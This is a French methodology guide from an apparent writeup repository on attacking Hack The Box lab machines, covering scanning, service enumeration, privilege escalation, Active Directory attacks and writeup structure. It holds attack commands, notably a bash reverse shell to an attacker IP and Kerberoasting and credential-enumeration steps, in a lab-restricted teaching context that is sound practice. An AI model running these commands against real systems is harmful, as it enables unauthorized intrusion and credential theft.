# Méthode — attaquer une machine Hack The Box et en écrire le writeup

Ce document décrit **comment on travaille** sur une machine HTB, du premier `nmap` à la rédaction.
Il ne remplace pas un writeup : il donne la démarche commune à toutes les machines, pour que
chaque writeup du dépôt se lise de la même façon.

Retour à l'[index Hack The Box](README.md) · [index des writeups](../README.md)

## Sommaire

- [Cadre](#cadre)
- [Avant de commencer](#avant-de-commencer)
- [Reconnaissance](#reconnaissance)
- [Énumération par service](#énumération-par-service)
- [Accès initial](#accès-initial)
- [Élévation de privilèges — Linux](#élévation-de-privilèges--linux)
- [Élévation de privilèges — Windows](#élévation-de-privilèges--windows)
- [Active Directory](#active-directory)
- [Après le root](#après-le-root)
- [Rédiger le writeup](#rédiger-le-writeup)
- [Pièges fréquents](#pièges-fréquents)
- [Références externes](#références-externes)

## Cadre

Les machines HTB sont des environnements **conçus pour être attaqués**, dans le cadre de leurs
conditions d'utilisation. Rien ici ne s'applique à un système réel sans autorisation écrite.

Deux règles du dépôt :

- **machine active → `status: draft`.** Publier la solution d'une machine encore active gâche le
  jeu des autres et sort du cadre prévu par HTB.
- **flags tronqués.** `HTB{...}` suffit à prouver le passage ; le flag complet n'apporte rien.

## Avant de commencer

```bash
# 1. tunnel HTB
sudo openvpn --config ~/htb/eu-vip.ovpn --daemon

# 2. espace de travail par machine, jamais dans le dépôt
mkdir -p ~/htb/machines/<nom>/{nmap,web,loot} && cd ~/htb/machines/<nom>

# 3. session persistante : tout ce qui est tapé doit finir dans le writeup
tmux new -s <nom>
script -q session.log     # journal brut de la session, filet de sécurité
```

Nom d'hôte local, pour éviter de retaper l'IP :

```bash
echo "10.10.11.42  <nom>.htb" | sudo tee -a /etc/hosts
```

Un dossier `loot/` garde les fichiers récupérés (hash, clés, dumps) : c'est ce qui permet de
rejouer le writeup six mois plus tard.

## Reconnaissance

Toujours deux passes : une rapide sur les ports classiques, une complète sur les 65 535.

```bash
# passe 1 : services et scripts par défaut
nmap -sC -sV -oA nmap/initial 10.10.11.42

# passe 2 : tous les ports, puis identification des ports ouverts
nmap -p- --min-rate 2000 -oA nmap/allports 10.10.11.42
nmap -sC -sV -p 22,80,445 -oA nmap/services 10.10.11.42

# UDP : souvent oublié, souvent payant (SNMP, TFTP, NFS)
sudo nmap -sU --top-ports 50 -oA nmap/udp 10.10.11.42
```

Ce qu'on note dans le writeup : la **version exacte** de chaque service. C'est elle qui déclenche
la recherche d'exploit, pas le nom du service.

```bash
searchsploit "vsftpd 2.3.4"
searchsploit -m 49757        # copie l'exploit dans le dossier courant
```

## Énumération par service

Chaque service ouvert a sa check-list. Le writeup doit dire **ce qui a été essayé**, y compris
les impasses : c'est la partie la plus utile pour un lecteur bloqué au même endroit.

### FTP (21)

```bash
ftp 10.10.11.42             # anonymous / anonymous
wget -m --no-passive ftp://anonymous:anonymous@10.10.11.42/
```

À regarder : accès anonyme en écriture, versions historiques (`vsftpd 2.3.4`, `ProFTPD 1.3.5`),
fichiers de sauvegarde déposés par un admin.

### SMB (139, 445)

```bash
netexec smb 10.10.11.42 -u '' -p '' --shares --users
smbclient -L //10.10.11.42/ -N
smbmap -H 10.10.11.42 -u anonymous
enum4linux-ng -A 10.10.11.42
```

À regarder : sessions nulles, partages en écriture, `signing: False` (relais NTLM), énumération
de comptes, scripts de connexion dans `NETLOGON`, GPP dans `SYSVOL`.

### HTTP / HTTPS (80, 443, 8000, 8080…)

```bash
whatweb http://10.10.11.42
feroxbuster -u http://10.10.11.42 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -u http://10.10.11.42 -H "Host: FUZZ.<nom>.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

Ordre de lecture : bannière et `robots.txt` → technologies → contenu caché → vhosts → paramètres
(`?page=`, `?file=`) → formulaires et uploads → CMS et version exacte.

### LDAP / Kerberos (389, 636, 88)

```bash
ldapsearch -x -H ldap://10.10.11.42 -s base namingcontexts
ldapsearch -x -H ldap://10.10.11.42 -b "DC=<domaine>,DC=htb" '(objectClass=user)' sAMAccountName
kerbrute userenum -d <domaine>.htb --dc 10.10.11.42 users.txt
```

### WinRM (5985), MSSQL (1433), RDP (3389), NFS (2049)

```bash
evil-winrm -i 10.10.11.42 -u user -p 'motdepasse'
impacket-mssqlclient <domaine>/user:'pass'@10.10.11.42 -windows-auth
showmount -e 10.10.11.42
```

## Accès initial

Trois voies, dans cet ordre de fréquence : **identifiants trouvés** (fichier, partage, config),
**vulnérabilité applicative** (LFI, upload, injection, désérialisation), **CVE d'infrastructure**
(service obsolète).

```bash
# shell stable plutôt qu'un nc qui meurt au premier Ctrl-C
rlwrap -cAr nc -lvnp 4444
# côté cible
bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'
```

Réflexe après le premier accès : `id`, `hostname`, `uname -a`, `ip a`, `cat /etc/passwd`. Ces cinq
sorties vont dans le writeup, elles situent le contexte.

## Élévation de privilèges — Linux

```bash
id && sudo -l
find / -perm -4000 -type f 2>/dev/null            # SUID -> GTFOBins
getcap -r / 2>/dev/null                            # capabilities
cat /etc/crontab; ls -la /etc/cron.*               # cron en écriture
ls -la /opt /srv /var/www                          # scripts maison
ss -tulpn                                          # services en localhost
uname -a                                           # noyau, en dernier recours
```

Puis `linpeas.sh` pour ne rien rater, mais **après** les vérifications manuelles : on comprend mieux
ce qu'on trouve quand on l'a cherché soi-même.

Les classiques : `sudo` sur un binaire GTFOBins, script cron exécuté par root et modifiable,
`LD_PRELOAD` conservé, NFS `no_root_squash`, groupe `docker` ou `lxd`, mot de passe réutilisé
depuis la base web.

## Élévation de privilèges — Windows

```powershell
whoami /priv
whoami /groups
cmdkey /list
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
wmic service get name,pathname,startmode | findstr /i auto
```

Ordre de lecture : privilèges `SeImpersonate`/`SeAssignPrimaryToken` (Potato family) → chemins de
service sans guillemets → `AlwaysInstallElevated` → identifiants stockés → ACL faibles sur un
service ou un dossier → `winPEAS` / `PowerUp.ps1` pour le balayage.

## Active Directory

```bash
netexec smb <dc> -u user -p pass --users --groups --shares
bloodhound-python -u user -p pass -d <domaine>.htb -ns <dc> -c All
impacket-GetUserSPNs <domaine>.htb/user:pass -dc-ip <dc> -request
impacket-GetNPUsers <domaine>.htb/ -usersfile users.txt -dc-ip <dc>
certipy find -u user@<domaine>.htb -p pass -dc-ip <dc>
```

Chemins fréquents : AS-REP roastable → Kerberoast → ACL (`GenericAll`, `WriteDACL`, `ForceChangePassword`)
→ ADCS (ESC1 à ESC8) → délégations → `RBCD`. BloodHound donne le chemin, il ne l'exploite pas :
le writeup doit expliquer **pourquoi** l'arête existe.

## Après le root

- prouver : `cat /root/root.txt` (tronqué dans le writeup) ;
- pivoter si une seconde machine est dans le périmètre (`chisel`, `ligolo-ng`) ;
- noter l'heure de fin : elle sert à la chronologie du writeup ;
- nettoyer : shells, fichiers déposés, tunnels.

## Rédiger le writeup

Structure attendue par le dépôt (voir [`_template/README.md`](../_template/README.md)) :

1. **TL;DR** — trois lignes : vecteur d'entrée → utilisateur → root.
2. **Fiche machine** — OS, difficulté, IP, date, services ouverts.
3. **Reconnaissance** — les deux scans, avec la sortie utile (pas les 65 535 lignes).
4. **Énumération** — par service, avec les impasses assumées.
5. **Accès initial** — la commande exacte, la sortie qui prouve le shell.
6. **Utilisateur** — le flag `user.txt` tronqué et ce qu'il a fallu faire pour l'atteindre.
7. **Root / Administrateur** — idem, avec l'explication de la faille.
8. **Leçons** — ce qui a coûté du temps, ce qu'on refera différemment.

Ce qui distingue un writeup utile d'un copier-coller de terminal :

- **le raisonnement** : pourquoi ce port, pourquoi cette hypothèse, pourquoi ça a échoué ;
- **les commandes complètes**, rejouables telles quelles ;
- **les versions** des outils quand le comportement change (`netexec` vs `crackmapexec`) ;
- **les captures** limitées à ce qui est illisible en texte (interface web, BloodHound).

## Pièges fréquents

1. **Sauter le scan complet** : un service sur un port haut est souvent le seul vecteur.
2. **Ignorer les vhosts** : `ffuf -H "Host: FUZZ"` révèle l'application réellement vulnérable.
3. **Publier une machine active** : `status: draft` tant qu'elle est en jeu.
4. **Recopier un writeup existant** : voir la section suivante, ce n'est pas une question de style.
5. **Coller un flag complet** : la CI du dépôt le refuse, et cela gâche la machine pour les autres.
6. **Oublier la sortie qui prouve le passage** : un writeup sans preuve ne se distingue pas d'une
   invention.
7. **Écrire « puis j'ai obtenu root »** : c'est précisément l'étape que le lecteur vient chercher.

## Références externes

Ces ressources sont citées comme lectures, jamais recopiées : le dépôt ne publie que du contenu
original.

- [HackTricks](https://book.hacktricks.wiki/) — check-lists par service et par technologie.
- [GTFOBins](https://gtfobins.github.io/) — binaires détournables sous Linux.
- [LOLBAS](https://lolbas-project.github.io/) — équivalent Windows.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — charges et
  techniques classées par contexte.
- [0xdf](https://0xdf.gitlab.io/) et [IppSec](https://www.youtube.com/@ippsec) — les writeups et
  vidéos de référence de la communauté, pour comparer **après** avoir cherché.
- [momenbasel/htb-writeups](https://github.com/momenbasel/htb-writeups),
  [zweilosec/htb-writeups](https://github.com/zweilosec/htb-writeups) — collections publiques
  utiles pour voir comment d'autres structurent leurs notes.
